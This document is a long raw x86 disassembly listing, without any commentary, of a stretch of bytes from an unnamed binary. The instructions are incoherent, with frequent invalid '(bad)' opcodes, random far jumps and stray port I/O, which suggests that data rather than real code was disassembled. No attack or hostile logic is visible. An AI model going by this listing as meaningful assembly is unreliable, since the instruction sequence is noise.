  415659:	out    0x29,al
  41565b:	test   DWORD PTR [esi-0x72e9b602],ecx
  415661:	inc    eax
  415662:	in     eax,dx
  415663:	inc    edi
  415664:	leave  
  415665:	adc    edi,esi
  415667:	jg     0x415614
  415669:	pop    ecx
  41566a:	loope  0x41560b
  41566c:	inc    edx
  41566d:	popf   
  41566e:	push   0xffffff89
  415670:	out    dx,al
  415671:	fwait
  415672:	and    BYTE PTR [ebx-0xf],al
  415675:	cs cmp al,0x18
  415678:	dec    esp
  415679:	push   cs
  41567a:	adc    DWORD PTR [ebx+ebx*4+0xb],0x10cc0494
  415682:	inc    esi
  415683:	mov    ah,0xf6
  415685:	jns    0x415692
  415687:	or     al,BYTE PTR [esi-0x33]
  41568a:	xchg   DWORD PTR [edi],ebp
  41568c:	adc    eax,DWORD PTR [ecx]
  41568e:	cmp    bh,cl
  415690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415691:	int3   
  415692:	(bad)  
  415693:	jmp    0x8fe1:0x4322d6e1
  41569a:	sbb    bl,BYTE PTR [eax+ebp*2-0x6e]
  41569e:	jbe    0x41570f
  4156a0:	pop    ebp
  4156a1:	out    dx,al
  4156a2:	push   ss
  4156a3:	stos   BYTE PTR es:[edi],al
  4156a4:	xlat   BYTE PTR ds:[ebx]
  4156a5:	test   dl,dh
  4156a7:	mov    WORD PTR [edi],ss
  4156a9:	cmp    edx,DWORD PTR [edx-0x30006490]
  4156af:	inc    ebx
  4156b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156b1:	fstp   DWORD PTR [ecx+eiz*4-0xe98ed98]
  4156b8:	mov    ch,0xf7
  4156ba:	push   esi
  4156bb:	or     BYTE PTR [ecx+0x27056cef],bl
  4156c1:	jecxz  0x41564a
  4156c3:	retf   0xba01
  4156c6:	ins    BYTE PTR es:[edi],dx
  4156c7:	ja     0x415710
  4156c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ca:	in     al,dx
  4156cb:	push   ecx
  4156cc:	xor    esp,DWORD PTR [edx-0x2c64d62b]
  4156d2:	sbb    eax,0x318b336
  4156d7:	dec    ebx
  4156d8:	xchg   ebp,eax
  4156d9:	mov    ecx,DWORD PTR [ebx-0x2b1f84b1]
  4156df:	pushf  
  4156e0:	cmp    ebp,DWORD PTR [edi+0x57ad88cc]
  4156e6:	sub    edx,DWORD PTR [edx+0x12e2d2e6]
  4156ec:	add    al,0xf3
  4156ee:	inc    ebp
  4156ef:	stos   DWORD PTR es:[edi],eax
  4156f0:	mov    ebp,0x23280ea5
  4156f5:	out    dx,al
  4156f6:	and    DWORD PTR [edi-0x80],eax
  4156f9:	loopne 0x415756
  4156fb:	sahf   
  4156fc:	xchg   DWORD PTR [ebx+0x5a],eax
  4156ff:	scas   eax,DWORD PTR es:[edi]
  415700:	cli    
  415701:	pushf  
  415702:	inc    edx
  415703:	add    ah,BYTE PTR [ecx]
  415705:	in     al,0x8f
  415707:	in     eax,0xc0
  415709:	sti    
  41570a:	sub    eax,0x5fca45c
  41570f:	daa    
  415710:	pop    ecx
  415711:	sub    edi,DWORD PTR [ecx+0x21696074]
  415717:	daa    
  415718:	inc    edx
  415719:	push   ecx
  41571a:	gs retf 0x3972
  41571e:	push   ss
  41571f:	stos   DWORD PTR es:[edi],eax
  415720:	dec    edx
  415721:	adc    eax,0x20b69c7e
  415726:	add    BYTE PTR ds:0xbff13d,ch
  41572c:	jne    0x4156ec
  41572e:	iret   
  41572f:	jne    0x41579c
  415731:	mov    al,ds:0xf381176c
  415736:	clc    
  415737:	cs mov esi,0x2c1a61e9
  41573d:	jl     0x415753
  41573f:	sbb    eax,DWORD PTR [edx+0x408007fe]
  415745:	sub    BYTE PTR [eax+0x4b],dh
  415748:	icebp  
  415749:	inc    ecx
  41574a:	mov    ds:0x957b2c5f,eax
  41574f:	adc    DWORD PTR [ecx-0x1017ca17],0x69
  415756:	pop    esi
  415757:	int    0x2f
  415759:	test   BYTE PTR [edx+0x3e],dh
  41575c:	sub    dh,BYTE PTR [esi]
  41575e:	shl    DWORD PTR [edi+0x47],1
  415761:	xor    dl,BYTE PTR [ebx-0x25]
  415764:	push   es
  415765:	lods   eax,DWORD PTR ds:[esi]
  415766:	das    
  415767:	repz rcr BYTE PTR [edx-0x75291667],0x1c
  41576f:	imul   esi,DWORD PTR [ebx-0x222da673],0xde15e91b
  415779:	je     0x415742
  41577b:	push   es
  41577c:	test   DWORD PTR [esi],ebx
  41577e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41577f:	gs jne 0x415717
  415782:	jo     0x415717
  415784:	mov    edi,0x150ef74c
  415789:	or     ebp,DWORD PTR [ebx+0x4c]
  41578c:	mov    edx,0xe3a6b40e
  415791:	xchg   DWORD PTR [esi+0x5d19c00b],edx
  415797:	fadd   DWORD PTR [edi]
  415799:	call   0x4a8c:0x87a89866
  4157a0:	add    dl,ah
  4157a2:	inc    edi
  4157a3:	icebp  
  4157a4:	mov    bh,BYTE PTR [edi]
  4157a6:	lea    ebx,[edx]
  4157a8:	sbb    DWORD PTR [ecx-0x2],esi
  4157ab:	or     BYTE PTR [edx+edx*2+0x51475d72],cl
  4157b2:	fsub   QWORD PTR [ecx+eax*1]
  4157b5:	fdiv   DWORD PTR ds:0xed82c65c
  4157bb:	cld    
  4157bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157bd:	or     al,0x93
  4157bf:	inc    ebx
  4157c0:	icebp  
  4157c1:	int3   
  4157c2:	lea    eax,[eax]
  4157c4:	fldenv [esi]
  4157c6:	jg     0x415840
  4157c8:	adc    ah,0xd0
  4157cb:	pop    esp
  4157cc:	inc    esp
  4157cd:	pushf  
  4157ce:	test   BYTE PTR [esi+0x9],ah
  4157d1:	cmp    edi,edi
  4157d3:	cmc    
  4157d4:	or     eax,0xbfe677b7
  4157d9:	sahf   
  4157da:	mov    ds:0x5531c493,al
  4157df:	or     BYTE PTR [eax],0x42
  4157e2:	xchg   ecx,eax
  4157e3:	xor    esi,ebx
  4157e5:	int3   
  4157e6:	shr    esp,cl
  4157e8:	inc    ecx
  4157e9:	fwait
  4157ea:	test   BYTE PTR [esi],cl
  4157ec:	shr    al,0xd6
  4157ef:	mov    bl,0x2b
  4157f1:	and    dh,dl
  4157f3:	cmp    BYTE PTR [ecx+eiz*4],0xfc
  4157f7:	repnz ins BYTE PTR es:[edi],dx
  4157f9:	rol    ch,0x63
  4157fc:	fs fucomp st(7)
  4157ff:	jp     0x41578e
  415801:	mov    esp,0x6946346f
  415806:	add    sp,cx
  415809:	dec    ecx
  41580a:	js     0x4157f3
  41580c:	aaa    
  41580d:	mov    al,ds:0xe291c088
  415812:	cmp    bl,ch
  415814:	cmp    eax,0x34711dd2
  415819:	pop    eax
  41581a:	shl    al,1
  41581c:	aad    0x7c
  41581e:	lods   eax,DWORD PTR ds:[esi]
  41581f:	push   eax
  415820:	inc    edi
  415821:	fdivr  QWORD PTR [edx-0x7840d725]
  415827:	imul   esi,DWORD PTR [eax-0x11ca83f],0x3c81a67d
  415831:	ss adc al,0x2e
  415834:	out    0xfb,eax
  415836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415837:	xchg   edi,eax
  415838:	sub    cl,0x3
  41583b:	xor    ecx,DWORD PTR [esi]
  41583d:	push   edi
  41583e:	xchg   ebp,eax
  41583f:	sti    
  415840:	dec    edi
  415841:	idiv   eax
  415843:	je     0x415856
  415845:	xor    BYTE PTR [esi+0xd1b4be5],ch
  41584b:	add    ch,bh
  41584d:	cwde   
  41584e:	and    DWORD PTR [edx],ebp
  415850:	div    BYTE PTR [ecx]
  415852:	scas   eax,DWORD PTR es:[edi]
  415853:	sbb    esp,ebp
  415855:	aas    
  415856:	mov    dh,dl
  415858:	inc    edi
  415859:	push   ds
  41585a:	push   si
  41585c:	jmp    0x8aae99a5
  415861:	mov    ebx,ds
  415863:	push   eax
  415864:	add    al,0xb5
  415866:	fsubr  DWORD PTR [ebx-0x44]
  415869:	mov    BYTE PTR [edx],dh
  41586b:	mov    WORD PTR [ecx-0x2a],gs
  41586e:	mov    ds,WORD PTR [edx+0x3f]
  415871:	fdiv   QWORD PTR [esi]
  415873:	sbb    BYTE PTR ds:0x34f3db1c,0x47
  41587a:	stos   DWORD PTR es:[edi],eax
  41587b:	inc    BYTE PTR [esi-0x29]
  41587e:	ds mov esp,0x5a6414b8
  415884:	mov    ch,0x34
  415886:	outs   dx,BYTE PTR ds:[esi]
  415887:	mov    ecx,0xa6337191
  41588c:	cmp    ebx,DWORD PTR [edx]
  41588e:	jno    0x4158a7
  415890:	cmp    BYTE PTR [eax+0x3b],cl
  415893:	add    edi,eax
  415895:	out    0x9f,eax
  415897:	sub    DWORD PTR ss:[ebp-0x1f656a86],0xf88f6138
  4158a2:	sub    BYTE PTR [ecx+0xb062fbc],dh
  4158a8:	adc    DWORD PTR [edx-0x103ab29f],edx
  4158ae:	out    0xc3,eax
  4158b0:	ins    DWORD PTR es:[edi],dx
  4158b1:	xor    al,0xa8
  4158b3:	test   ecx,edx
  4158b5:	mov    DWORD PTR [edx+0x74fe0fdf],edx
  4158bb:	xor    bl,BYTE PTR [ecx]
  4158bd:	int3   
  4158be:	jle    0x415890
  4158c0:	stos   DWORD PTR es:[edi],eax
  4158c1:	addr16 add eax,0x199c85ef
  4158c7:	pusha  
  4158c8:	in     al,0x99
  4158ca:	cmp    al,0xf3
  4158cc:	pop    ebp
  4158cd:	es xchg ebp,eax
  4158cf:	sti    
  4158d0:	test   eax,0x28f608de
  4158d5:	dec    edx
  4158d6:	dec    eax
  4158d7:	mov    esi,0x66a4fe60
  4158dc:	sahf   
  4158dd:	ret    0x8280
  4158e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e1:	cld    
  4158e2:	mov    DWORD PTR [esi-0x167df862],0xaa61dd29
  4158ec:	loop   0x4158af
  4158ee:	jne    0x415870
  4158f0:	out    0x7d,eax
  4158f2:	mov    ecx,0xa2f51025
  4158f7:	push   ds
  4158f8:	stos   DWORD PTR es:[edi],eax
  4158f9:	in     al,dx
  4158fa:	jb     0x415941
  4158fc:	enter  0xdbe3,0xd3
  415900:	mov    DWORD PTR [edx+eax*8],esp
  415903:	add    BYTE PTR [ebx],dl
  415905:	aaa    
  415906:	fmul   st,st(4)
  415908:	addr16 push ebx
  41590a:	sbb    ecx,DWORD PTR [edi+edx*8+0x59]
  41590e:	popf   
  41590f:	daa    
  415910:	mov    ebp,0x987f52c7
  415915:	pop    edi
  415916:	dec    BYTE PTR [ecx]
  415918:	xor    eax,0x9261cca6
  41591d:	push   ecx
  41591e:	fnstsw WORD PTR [esi]
  415920:	pop    ds
  415921:	mov    ebx,0xb3e50245
  415926:	add    DWORD PTR [ebx],ebp
  415928:	pop    esp
  415929:	fs scas eax,DWORD PTR es:[edi]
  41592b:	mov    ebp,0xeadeeb49
  415930:	(bad)  
  415931:	xchg   esi,eax
  415932:	mov    esp,0xf277d081
  415937:	lea    ebx,[edx-0x23]
  41593a:	mov    ecx,0x7d61a6f2
  41593f:	es xchg edi,eax
  415941:	data16 setl cl
  415945:	pop    es
  415946:	xor    DWORD PTR cs:0x8960ebfe,0xffffffdb
  41594e:	jl     0x415917
  415950:	cmp    al,BYTE PTR [edi+ebp*8-0x80]
  415954:	fmul   DWORD PTR ds:0x247c052e
  41595a:	mov    bh,dl
  41595c:	ror    bl,0x8d
  41595f:	dec    ebp
  415960:	mov    eax,0x8b1237eb
  415965:	cmp    BYTE PTR [ecx-0x2a],al
  415968:	mov    eax,ds:0xcb3bdda7
  41596d:	iret   
  41596e:	jnp    0x4159ca
  415970:	mov    ss,WORD PTR [eax+ebp*4+0x25]
  415974:	ss pop ebp
  415976:	xchg   DWORD PTR [ebx+ebp*1+0x704fe5c3],esp
  41597d:	mov    cl,0xb9
  41597f:	sbb    eax,0xacd3f321
  415984:	imul   ebp,esi,0xb78e1999
  41598a:	in     al,0xb8
  41598c:	push   edx
  41598d:	(bad)  
  41598f:	push   ss
  415990:	or     eax,0xd08f3a2d
  415995:	enter  0x6685,0x9b
  415999:	popf   
  41599a:	mov    BYTE PTR [edi+0x49f5101f],dh
  4159a0:	or     BYTE PTR [edx],dl
  4159a2:	add    al,al
  4159a4:	inc    eax
  4159a5:	nop
  4159a6:	push   0xfffffff8
  4159a8:	xor    BYTE PTR [ebx+0x49],bh
  4159ab:	xor    eax,eax
  4159ad:	rcr    BYTE PTR [ebx+0x498aa86c],cl
  4159b3:	push   edi
  4159b4:	xchg   esp,eax
  4159b5:	out    dx,eax
  4159b6:	or     BYTE PTR [eax+0x39e28122],0x82
  4159bd:	mov    ah,0xa9
  4159bf:	adc    BYTE PTR [esi-0x2b],0xf5
  4159c3:	dec    ecx
  4159c4:	out    0x80,eax
  4159c6:	or     DWORD PTR [edx-0x35],ebx
  4159c9:	lock xlat BYTE PTR ds:[ebx]
  4159cb:	leave  
  4159cc:	push   ecx
  4159cd:	xor    al,0xba
  4159cf:	xor    BYTE PTR [edx],bh
  4159d1:	jo     0x415988
  4159d3:	or     al,0x9d
  4159d5:	mov    ds:0x5c935ba0,al
  4159da:	pop    eax
  4159db:	imul   edi,DWORD PTR [edi-0x19714d55],0xffffffea
  4159e2:	stc    
  4159e3:	mov    es,WORD PTR [edx]
  4159e5:	xchg   BYTE PTR ds:0xecaea9d8,cl
  4159eb:	aaa    
  4159ec:	xchg   ebx,eax
  4159ed:	pop    ds
  4159ee:	jmp    0x415982
  4159f0:	jae    0x415a31
  4159f2:	loopne 0x4159dd
  4159f4:	(bad)  
  4159f5:	iret   
  4159f6:	sbb    eax,0xbaea2cd3
  4159fb:	and    BYTE PTR [esi+0x4b],bl
  4159fe:	inc    esi
  4159ff:	dec    DWORD PTR [ebx-0x5ab16561]
  415a05:	inc    ebx
  415a06:	enter  0xbb1,0xab
  415a0a:	out    0x52,eax
  415a0c:	mov    ds:0xcf3c0449,eax
  415a11:	and    eax,0x96e51841
  415a16:	(bad)  
  415a17:	aam    0xdc
  415a19:	fadd   QWORD PTR [esi]
  415a1b:	nop
  415a1c:	mov    edi,0xd8c86492
  415a21:	shl    DWORD PTR [ebx+0x16],cl
  415a24:	xor    al,0xb7
  415a26:	ss arpl cx,bp
  415a29:	stos   BYTE PTR es:[edi],al
  415a2a:	je     0x415a27
  415a2c:	and    DWORD PTR fs:[edi],esi
  415a2f:	mov    dl,0x8d
  415a31:	bound  edx,QWORD PTR [ebp+0x32eb950]
  415a37:	mov    ch,0x30
  415a39:	adc    eax,0x981e2958
  415a3e:	stos   DWORD PTR es:[edi],eax
  415a3f:	xor    DWORD PTR [ecx+0x17],eax
  415a42:	mov    edx,0x2d2b5a8f
  415a47:	push   eax
  415a48:	push   ebx
  415a49:	pop    ds
  415a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a4b:	out    0x7e,al
  415a4d:	sbb    eax,ebp
  415a4f:	jg     0x415a9d
  415a51:	jge    0x415a14
  415a53:	(bad)  
  415a54:	fninit 
  415a56:	ret    
  415a57:	mov    WORD PTR [esi],es
  415a59:	add    eax,0xbb2a4cc8
  415a5e:	jmp    0x6b9b:0x60f56304
  415a65:	sub    al,0xf3
  415a67:	popf   
  415a68:	pop    esi
  415a69:	pop    edi
  415a6a:	imul   eax,DWORD PTR [edi],0xb618f7ec
  415a70:	or     al,BYTE PTR [eax+esi*4]
  415a73:	into   
  415a74:	jo     0x415aa9
  415a76:	test   eax,0xea06fa65
  415a7b:	inc    esp
  415a7c:	daa    
  415a7d:	pop    esp
  415a7e:	aam    0x33
  415a80:	or     DWORD PTR [ebp+0x398ca54f],0x42
  415a87:	loopne 0x415a3c
  415a89:	xor    eax,0xdaa20a48
  415a8e:	and    cl,0xf6
  415a91:	pushf  
  415a92:	retf   0xc4f1
  415a95:	push   cs
  415a96:	and    ah,BYTE PTR [esi+edx*2]
  415a99:	sub    DWORD PTR [esp+edi*4-0x269ba9bc],esi
  415aa0:	hlt    
  415aa1:	cmp    BYTE PTR [eax+0x7e],ch
  415aa4:	xor    al,0xff
  415aa6:	jno    0x415b25
  415aa8:	test   BYTE PTR [edx],dl
  415aaa:	scas   eax,DWORD PTR es:[edi]
  415aab:	mov    ds:0x6b25d0f,eax
  415ab0:	mov    ebp,0xe6470f05
  415ab5:	pop    es
  415ab6:	(bad)  
  415ab7:	jp     0x415b34
  415ab9:	sti    
  415aba:	enter  0xe559,0xc1
  415abe:	outs   dx,BYTE PTR ds:[esi]
  415abf:	add    eax,DWORD PTR [ebp+0x5328cb78]
  415ac5:	add    eax,0xab1a2869
  415aca:	and    ah,dh
  415acc:	scas   eax,DWORD PTR es:[edi]
  415acd:	jmp    0x5d4e:0x424b6d3e
  415ad4:	sub    BYTE PTR [eax-0x3b66c958],0x1d
  415adb:	dec    esp
  415adc:	adc    eax,0xe3cba2a0
  415ae1:	sub    dh,BYTE PTR [ebp+eax*8+0x675ef552]
  415ae8:	fsubp  st(1),st
  415aea:	jg     0x415b68
  415aec:	mov    eax,0x745a1356
  415af1:	ds clc 
  415af3:	mov    dl,0x40
  415af5:	push   0x5d952e51
  415afa:	mov    eax,0xaa87da29
  415aff:	xchg   ebp,eax
  415b00:	ror    BYTE PTR [eax],cl
  415b02:	dec    ecx
  415b03:	pop    ecx
  415b04:	add    BYTE PTR [esi+eax*2],bh
  415b07:	push   ss
  415b08:	push   edx
  415b09:	shl    DWORD PTR [edx],1
  415b0b:	fwait
  415b0c:	popf   
  415b0d:	pop    edx
  415b0e:	retf   
  415b0f:	daa    
  415b10:	mov    esi,0xd2401923
  415b15:	xchg   ecx,eax
  415b16:	popa   
  415b17:	jno    0x415aae
  415b19:	and    ebp,DWORD PTR [ebx+eiz*4]
  415b1c:	cld    
  415b1d:	and    dl,BYTE PTR [edi+0x7041fdb8]
  415b23:	not    dl
  415b25:	xlat   BYTE PTR ds:[ebx]
  415b26:	xchg   ebx,eax
  415b27:	pop    eax
  415b28:	adc    esp,DWORD PTR [esi+0x23b97817]
  415b2e:	xchg   edi,eax
  415b2f:	aam    0x53
  415b31:	mov    ebp,0x99922e53
  415b36:	sbb    DWORD PTR [ebx-0x62],ebx
  415b39:	or     al,0x4f
  415b3b:	or     BYTE PTR [ebx],0x7
  415b3e:	retf   0xb741
  415b41:	mov    cl,0x77
  415b43:	jnp    0x415b5b
  415b45:	cmp    eax,0xe75760e5
  415b4a:	out    dx,al
  415b4b:	lods   eax,DWORD PTR ds:[esi]
  415b4c:	outs   dx,DWORD PTR ds:[esi]
  415b4d:	std    
  415b4e:	outs   dx,BYTE PTR ds:[esi]
  415b4f:	mov    edi,DWORD PTR [edi]
  415b51:	popa   
  415b52:	imul   edi,DWORD PTR [eax+0x6d],0xe8c33b96
  415b59:	popa   
  415b5a:	dec    esi
  415b5b:	inc    eax
  415b5c:	xor    BYTE PTR [ebp+0x54],bh
  415b5f:	inc    edx
  415b60:	mov    cl,0x11
  415b62:	nop
  415b63:	push   ss
  415b64:	or     eax,0x5d13b5e9
  415b69:	daa    
  415b6a:	mov    DWORD PTR ds:0x50f43302,edi
  415b70:	sbb    ebx,DWORD PTR [ecx]
  415b72:	div    DWORD PTR [ebx]
  415b74:	stos   DWORD PTR es:[edi],eax
  415b75:	rep movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  415b78:	sbb    eax,0x39686c10
  415b7d:	pop    ebp
  415b7e:	adc    ah,BYTE PTR [ebx]
  415b80:	fs xchg edi,eax
  415b82:	mov    ds:0xa9dab07f,al
  415b87:	hlt    
  415b88:	jbe    0x415b2c
  415b8a:	push   es
  415b8b:	dec    ebp
  415b8c:	jnp    0x415b1e
  415b8e:	(bad)  
  415b8f:	clc    
  415b90:	mov    ds:0xa4d55f3d,eax
  415b95:	stos   DWORD PTR es:[edi],eax
  415b96:	sbb    eax,0x4bd54e49
  415b9b:	lods   eax,DWORD PTR ds:[esi]
  415b9c:	outs   dx,BYTE PTR ds:[esi]
  415b9d:	lods   eax,DWORD PTR ds:[esi]
  415b9e:	mov    al,ds:0x254a601f
  415ba3:	xchg   BYTE PTR fs:[ebp+0x13c05a4],ah
  415baa:	je     0x415b88
  415bac:	mov    edx,0x73042845
  415bb1:	jmp    0x1780:0xdf8d97
  415bb8:	dec    ecx
  415bb9:	fstp   TBYTE PTR [ecx]
  415bbb:	loop   0x415b6c
  415bbd:	xchg   ebx,eax
  415bbe:	std    
  415bbf:	push   esp
  415bc0:	ficom  WORD PTR [esi+edi*2-0x32]
  415bc4:	mov    dh,0x84
  415bc6:	cmp    DWORD PTR [ebx-0x68],esi
  415bc9:	xchg   edi,eax
  415bca:	and    BYTE PTR [esi-0x15db270d],bh
  415bd0:	gs call 0x9420c1f3
  415bd6:	push   esp
  415bd7:	ins    DWORD PTR es:[edi],dx
  415bd8:	sbb    eax,0xc0d52344
  415bdd:	lods   al,BYTE PTR ds:[esi]
  415bde:	stc    
  415bdf:	loopne 0x415b87
  415be1:	fsub   QWORD PTR [ebx]
  415be3:	jge    0x415c26
  415be5:	data16 sti 
  415be7:	ins    DWORD PTR es:[edi],dx
  415be8:	mov    ds:0xba175c5b,al
  415bed:	pop    ecx
  415bee:	push   esp
  415bef:	jno    0x415c18
  415bf1:	pop    ds
  415bf2:	std    
  415bf3:	aas    
  415bf4:	clc    
  415bf5:	mov    ecx,0x196cf6da
  415bfa:	xchg   ebp,eax
  415bfb:	inc    ebx
  415bfc:	in     eax,0xba
  415bfe:	xchg   edx,eax
  415bff:	(bad)  
  415c00:	fnstsw WORD PTR [eax]
  415c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c03:	cld    
  415c04:	xchg   edi,eax
  415c05:	jbe    0x415c66
  415c07:	test   eax,0xe3869a79
  415c0c:	xor    al,BYTE PTR [eax+eax*2]
  415c0f:	xchg   edx,eax
  415c10:	retf   
  415c11:	test   DWORD PTR [edx-0x61a9f3d8],ebx
  415c17:	dec    eax
  415c18:	call   0x38c65ac3
  415c1d:	clc    
  415c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c1f:	sbb    ebx,DWORD PTR [ebx]
  415c21:	inc    ebx
  415c22:	xchg   ebx,ebp
  415c24:	pop    ebp
  415c25:	and    ebp,DWORD PTR [edx]
  415c27:	mov    ecx,0x55282bb3
  415c2c:	ins    BYTE PTR es:[edi],dx
  415c2d:	xlat   BYTE PTR ds:[ebx]
  415c2e:	lds    ebp,FWORD PTR [edx]
  415c30:	dec    edx
  415c31:	mov    al,0xfa
  415c33:	cmp    al,0xad
  415c35:	(bad)  
  415c36:	std    
  415c37:	push   cs
  415c38:	xadd   BYTE PTR [esi],dl
  415c3b:	int3   
  415c3c:	repz add DWORD PTR [edi-0x1dd1a8c5],ebp
  415c43:	retf   
  415c44:	ins    DWORD PTR es:[edi],dx
  415c45:	lea    edi,es:[edx+0x54]
  415c49:	mov    ebp,ss
  415c4b:	cmp    al,0xe5
  415c4d:	sbb    BYTE PTR [ebx-0x34],bh
  415c50:	in     eax,0x23
  415c52:	icebp  
  415c53:	(bad)  
  415c55:	dec    esp
  415c56:	fimul  DWORD PTR [ebx+0x71]
  415c59:	outs   dx,DWORD PTR ds:[esi]
  415c5a:	jge    0x415c0a
  415c5c:	xchg   edi,eax
  415c5d:	adc    ah,BYTE PTR [ebx+0x23a69c24]
  415c63:	mov    ch,0xd3
  415c65:	ret    
  415c66:	ins    DWORD PTR es:[edi],dx
  415c67:	sub    al,0xe8
  415c69:	out    0xd4,al
  415c6b:	popf   
  415c6c:	fstp   QWORD PTR [ecx+0x57252ae4]
  415c72:	cli    
  415c73:	test   ecx,edx
  415c75:	in     al,dx
  415c76:	add    BYTE PTR [edi+eax*2],bh
  415c79:	push   ebp
  415c7a:	ret    0x5cc2
  415c7d:	push   edx
  415c7e:	push   ebx
  415c7f:	xchg   edx,eax
  415c80:	adc    bl,BYTE PTR [esi+0x78e335c9]
  415c86:	xchg   edi,eax
  415c87:	lds    ecx,FWORD PTR [ebp-0x3f]
  415c8a:	pop    esp
  415c8b:	jo     0x415cdb
  415c8d:	arpl   WORD PTR [edi+0x29d1d0a4],dx
  415c93:	or     eax,0xee630c81
  415c98:	adc    cl,BYTE PTR [ecx]
  415c9a:	jle    0x415c5d
  415c9c:	rcl    BYTE PTR [ebx+0xa5de96b],0xd2
  415ca3:	and    ecx,ecx
  415ca5:	int3   
  415ca6:	fwait
  415ca7:	call   0x4910:0xcfc24509
  415cae:	mov    al,ds:0x14e87477
  415cb3:	sbb    DWORD PTR [edx+0x30bf6912],eax
  415cb9:	out    dx,eax
  415cba:	addr16 mov cl,0xab
  415cbd:	add    BYTE PTR [eax],0xbc
  415cc0:	fcom   DWORD PTR [esi+edx*2-0x27]
  415cc4:	dec    edi
  415cc5:	xor    al,0xd9
  415cc7:	pop    ss
  415cc8:	(bad)  
  415cc9:	sbb    eax,0xc7f379c2
  415cce:	inc    esi
  415ccf:	test   BYTE PTR [eax-0x7e],bl
  415cd2:	cld    
  415cd3:	push   ebx
  415cd4:	push   edi
  415cd5:	fldcw  WORD PTR [edi+edi*2+0x6c72af2d]
  415cdc:	or     DWORD PTR [edi-0x78],esi
  415cdf:	jnp    0x415d2d
  415ce1:	xor    al,0xf7
  415ce3:	add    edi,DWORD PTR [esi+0x1b06bfa0]
  415ce9:	xor    esp,DWORD PTR [eax-0x6f996b2b]
  415cef:	(bad)  
  415cf0:	inc    BYTE PTR [eax-0x3d5572a8]
  415cf6:	xchg   ebp,eax
  415cf7:	mov    ds:0xc41ca652,eax
  415cfc:	xlat   BYTE PTR ds:[ebx]
  415cfd:	(bad)
  415d01:	or     BYTE PTR [edi-0x190ac88],al
  415d07:	xchg   ebp,eax
  415d08:	adc    ah,BYTE PTR [esp+edi*2]
  415d0b:	xchg   DWORD PTR [edx+ecx*4+0x7c],ecx
  415d0f:	div    BYTE PTR [ebx-0x22]
  415d12:	cwde   
  415d13:	in     eax,dx
  415d14:	test   eax,0x3fcffafb
  415d19:	and    dh,0x91
  415d1c:	aaa    
  415d1d:	adc    dl,dl
  415d1f:	mov    ah,BYTE PTR [eax]
  415d21:	and    al,0x41
  415d23:	lods   al,BYTE PTR ds:[esi]
  415d24:	jb     0x415d17
  415d26:	mov    cl,0xb
  415d28:	scas   eax,DWORD PTR es:[edi]
  415d29:	jmp    0x23320a6c
  415d2e:	test   DWORD PTR [edi+esi*8+0x520af7cf],edi
  415d35:	sbb    DWORD PTR [edi-0x70b8c459],0x8d677385
  415d3f:	and    eax,0xbc141d42
  415d44:	pop    eax
  415d45:	leave  
  415d46:	push   0x3658bb21
  415d4b:	enter  0xa93,0xc3
  415d4f:	les    edx,FWORD PTR [edx-0x29]
  415d52:	mov    ds:0x5e0ddaab,eax
  415d57:	or     bh,0xe1
  415d5a:	and    al,0x8b
  415d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d5d:	pop    eax
  415d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d5f:	pop    ebx
  415d60:	es leave 
  415d62:	dec    edi
  415d63:	mov    esp,0x94da563c
  415d68:	int    0x28
  415d6a:	ss xchg ebp,eax
  415d6c:	mov    cs,WORD PTR ds:0x74222e9b
  415d72:	fiadd  DWORD PTR [ecx-0x7d9f440b]
  415d78:	sbb    edi,edx
  415d7a:	leave  
  415d7b:	and    al,0xe8
  415d7d:	popf   
  415d7e:	sbb    eax,0xa4570539
  415d83:	es ds stc 
  415d86:	jecxz  0x415ded
  415d88:	lods   al,BYTE PTR ds:[esi]
  415d89:	(bad)  
  415d8a:	imul   edx,DWORD PTR [ebx-0x7a],0x3d
  415d8e:	mov    ?,WORD PTR [edx+0x1e]
  415d91:	cmp    BYTE PTR [eax+ebp*2],bl
  415d94:	pop    ss
  415d95:	mov    WORD PTR [ecx-0x32],ss
  415d98:	or     al,0x9d
  415d9a:	cwde   
  415d9b:	xchg   DWORD PTR [ebx+0x1f5523d8],ebx
  415da1:	imul   ebx,DWORD PTR [edx],0xffffffae
  415da4:	xor    eax,0x90008d00
  415da9:	pop    DWORD PTR [ecx]
  415dab:	xor    al,0x16
  415dad:	mov    gs,WORD PTR [ebp-0x5b125877]
  415db3:	es (bad) 
  415db5:	jnp    0x415db4
  415db7:	mov    ecx,0x5ac24d18
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	cmp    eax,0xeed9dfeb
  415dc2:	dec    ebx
  415dc3:	and    BYTE PTR [ecx],ch
  415dc5:	sbb    bh,BYTE PTR [ebx-0x14]
  415dc8:	sub    ch,BYTE PTR [edi+0x3267e1a1]
  415dce:	jge    0x415deb
  415dd0:	sub    BYTE PTR [edi-0x27ba606f],cl
  415dd6:	pop    ebp
  415dd7:	int    0x6a
  415dd9:	adc    cl,BYTE PTR [ebp-0x5e]
  415ddc:	js     0x415dd7
  415dde:	iret   
  415ddf:	jnp    0x415db6
  415de1:	shr    DWORD PTR [esi],1
  415de3:	xlat   BYTE PTR ds:[ebx]
  415de4:	popa   
  415de5:	repnz (bad) 
  415de7:	adc    dh,BYTE PTR [edi+ebx*2+0x5]
  415deb:	and    DWORD PTR [edi],ebx
  415ded:	push   0x751531ac
  415df2:	pop    ecx
  415df3:	call   0xe16b:0xfa1ca99b
  415dfa:	add    DWORD PTR [ecx+0x1d],ebp
  415dfd:	jmp    esp
  415dff:	xchg   edx,eax
  415e00:	addr16 pop edx
  415e02:	pop    ecx
  415e03:	lods   eax,DWORD PTR ds:[esi]
  415e04:	mov    edi,0x129c7d37
  415e09:	inc    ebp
  415e0a:	loopne 0x415e76
  415e0c:	xchg   BYTE PTR [esi+0x46c9268e],dh
  415e12:	pop    ss
  415e13:	jno    0x415e7d
